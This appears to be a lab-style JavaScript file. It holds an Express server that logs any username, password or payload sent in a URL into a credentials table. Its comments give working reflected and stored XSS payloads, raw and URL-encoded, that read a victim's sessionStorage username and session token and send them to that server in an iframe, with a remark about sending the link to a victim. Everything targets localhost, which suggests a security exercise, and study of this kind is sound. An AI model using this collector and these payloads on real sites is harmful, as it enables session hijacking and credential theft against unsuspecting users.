const db = require("./db");

function insertRow(username, password) {
  db.run(
    `INSERT INTO credentials (username, password) VALUES (?, ?)`,
    [username, password],
    function (error) {
      if (error) {
        console.error(error.message);
      }
      console.log(`Inserted a row with the ID: ${this.lastID}`);
    }
  );
}


const express = require('express');
const app = express();
const path = require('path');

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));

app.get('/user/:username/:password', function(req, res) {
    console.log("app.get('/user/:username/:password', function(req, res)")

    console.log(req.params)

    insertRow(req.params.username, req.params.password);

    res.send("thanks");

});

app.post('/post/:username/:password', function(req, res) {
    console.log("app.get('/user/:username/:password', function(req, res)")

    console.log(req.params)

    insertRow(req.params.username, req.params.password);

    res.send("thanks");

});

app.post('/:payload', function(req, res) {
  console.log("post '/:payload'")

  console.log(req.params)

  insertRow(req.params.payload, "none");

  res.send("thanks");

});

app.get('/:payload', function(req, res) {
  console.log("get '/:payload'")

  console.log(req.params)

  insertRow(req.params.payload, "none");

  res.send("thanks");

});


app.listen(3001);

console.log("listening on port 3001")

/*

reflected xss

https://www.urlencoder.org/

document.write('<script>document.write("<iframe src=http://localhost:3001/user/"+sessionStorage.getItem("username")+"/"+sessionStorage.getItem("sessionToken")+"></iframe>");</script>')

document.write%28%27%3Cscript%3Edocument.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2Fuser%2F%22%2BsessionStorage.getItem%28%22username%22%29%2B%22%2F%22%2BsessionStorage.getItem%28%22sessionToken%22%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%3C%2Fscript%3E%27%29%0D%0A%0D%0A

http://localhost:3000/user/document.write%28%27%3Cscript%3Edocument.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2Fuser%2F%22%2BsessionStorage.getItem%28%22username%22%29%2B%22%2F%22%2BsessionStorage.getItem%28%22sessionToken%22%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%3C%2Fscript%3E%27%29%0D%0A%0D%0A

shorter version

document.write('<script>document.write("<iframe src=http://localhost:3001/"+JSON.stringify(sessionStorage)+"></iframe>");</script>')

http://localhost:3000/user/document.write%28%27%3Cscript%3Edocument.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2F%22%2BJSON.stringify%28sessionStorage%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%3C%2Fscript%3E%27%29

we send the previous link to victim

--------------------------------------------------------------------------
--------------------------------------------------------------------------
--------------------------------------------------------------------------
stored xss

store on http://localhost:3000/createPost

<script>document.write("<iframe src=http://localhost:3001/user/"+sessionStorage.getItem("username")+"/"+sessionStorage.getItem("sessionToken")+"></iframe>");</script>

launch on http://localhost:3000/viewPosts


--------------------------------------------------------------------------
--------------------------------------------------------------------------
--------------------------------------------------------------------------
dom based xss

--------------------------------------------------------------------------
--------------------------------------------------------------------------
--------------------------------------------------------------------------
csrf

/fishing/index.html
/fishing/payment_csrf.html

*/